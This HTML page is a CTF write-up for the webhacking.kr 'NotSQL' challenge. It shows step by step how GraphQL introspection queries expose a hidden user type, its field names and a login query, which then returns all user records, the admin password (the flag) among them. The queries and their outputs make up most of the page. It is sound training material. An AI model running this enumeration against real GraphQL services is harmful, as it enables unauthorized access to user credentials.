<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=429416b0fbd88183bc1fba2235ca959bf77e17b2">
    
<link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">

<!-- remove the cache headers -->
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>NotSQL | Avishai’s CTF Writeups</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="NotSQL" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="…" />
<meta property="og:description" content="…" />
<link rel="canonical" href="http://localhost:4000/CTF_writeups/webhacking.kr/NotSQL.html" />
<meta property="og:url" content="http://localhost:4000/CTF_writeups/webhacking.kr/NotSQL.html" />
<meta property="og:site_name" content="Avishai’s CTF Writeups" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="NotSQL" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"NotSQL","url":"http://localhost:4000/CTF_writeups/webhacking.kr/NotSQL.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/CTF_writeups/">
          <h1>Avishai's CTF Writeups</h1>
        </a>
        <h2>...</h2>

        <section id="downloads">
          
          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="webhacking-notsql-solution">Webhacking NotSQL Solution</h1>

<p>In this challenge we exploit vulnerabilities in <code class="language-plaintext highlighter-rouge">GraphQL</code></p>

<p>First we get all of the types:</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="err">__schema</span><span class="p">{</span><span class="err">types</span><span class="p">{</span><span class="err">name</span><span class="p">}}}</span><span class="w">
</span></code></pre></div></div>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"__schema"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"types"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Board"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Int"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"String"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"User_d51e7f78cbb219316e0b7cfe1a64540a"</span><span class="p">},</span><span class="w"> </span><span class="err">//</span><span class="w"> </span><span class="err">INTERESTING</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Query"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"CacheControlScope"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Upload"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Boolean"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"__Schema"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"__Type"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"__TypeKind"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"__Field"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"__InputValue"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"__EnumValue"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"__Directive"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"__DirectiveLocation"</span><span class="p">}</span><span class="w">
      </span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>next, we want to find the fields of this type:</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="err">__type(name:</span><span class="s2">"User_d51e7f78cbb219316e0b7cfe1a64540a"</span><span class="err">)</span><span class="p">{</span><span class="err">fields</span><span class="p">{</span><span class="err">name</span><span class="p">}}}</span><span class="w">
</span></code></pre></div></div>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"__type"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"fields"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"userid_a7fce99fa52d173843130a9620a787ce"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"passwd_e31db968948082b92e60411dd15a25cd"</span><span class="p">}</span><span class="w">
      </span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Now, we will check what are the available queries.</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="err">__type(name:</span><span class="s2">"Query"</span><span class="err">)</span><span class="p">{</span><span class="err">fields</span><span class="p">{</span><span class="err">name</span><span class="p">}}}</span><span class="w">
</span></code></pre></div></div>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"__type"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="nl">"fields"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"view"</span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"login_51b48f6f7e6947fba0a88a7147d54152"</span><span class="p">}</span><span class="w">
      </span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>OK, so there is a query that’s called: <code class="language-plaintext highlighter-rouge">login_51b48f6f7e6947fba0a88a7147d54152</code>, and we know the name of the fields. let’s try to give them to the query:</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="err">login_</span><span class="mi">51</span><span class="err">b</span><span class="mi">48</span><span class="err">f</span><span class="mi">6</span><span class="err">f</span><span class="mi">7e6947</span><span class="err">fba</span><span class="mi">0</span><span class="err">a</span><span class="mi">88</span><span class="err">a</span><span class="mi">7147</span><span class="err">d</span><span class="mi">54152</span><span class="p">{</span><span class="err">userid_a</span><span class="mi">7</span><span class="err">fce</span><span class="mi">99</span><span class="err">fa</span><span class="mi">52</span><span class="err">d</span><span class="mi">173843130</span><span class="err">a</span><span class="mi">9620</span><span class="err">a</span><span class="mi">787</span><span class="err">ce</span><span class="p">,</span><span class="err">passwd_e</span><span class="mi">31</span><span class="err">db</span><span class="mi">968948082</span><span class="err">b</span><span class="mi">92e60411</span><span class="err">dd</span><span class="mi">15</span><span class="err">a</span><span class="mi">25</span><span class="err">cd</span><span class="p">}}</span><span class="w">
</span></code></pre></div></div>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"login_51b48f6f7e6947fba0a88a7147d54152"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"userid_a7fce99fa52d173843130a9620a787ce"</span><span class="p">:</span><span class="w"> </span><span class="s2">"test-user"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"passwd_e31db968948082b92e60411dd15a25cd"</span><span class="p">:</span><span class="w"> </span><span class="s2">"test-password"</span><span class="w">
      </span><span class="p">},</span><span class="w">
      </span><span class="p">{</span><span class="w">
        </span><span class="nl">"userid_a7fce99fa52d173843130a9620a787ce"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"passwd_e31db968948082b92e60411dd15a25cd"</span><span class="p">:</span><span class="w"> </span><span class="s2">"FLAG{i_know_how_to_use_graphql}"</span><span class="w"> </span><span class="err">//</span><span class="w"> </span><span class="err">&lt;---</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p><img src="/CTF_writeups/webhacking.kr/images/NotSQL.png" alt="FLAG" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">FLAG{i_know_how_to_use_graphql}</code></em></strong></p>


      </section>
    </div>
  </body>
</html>
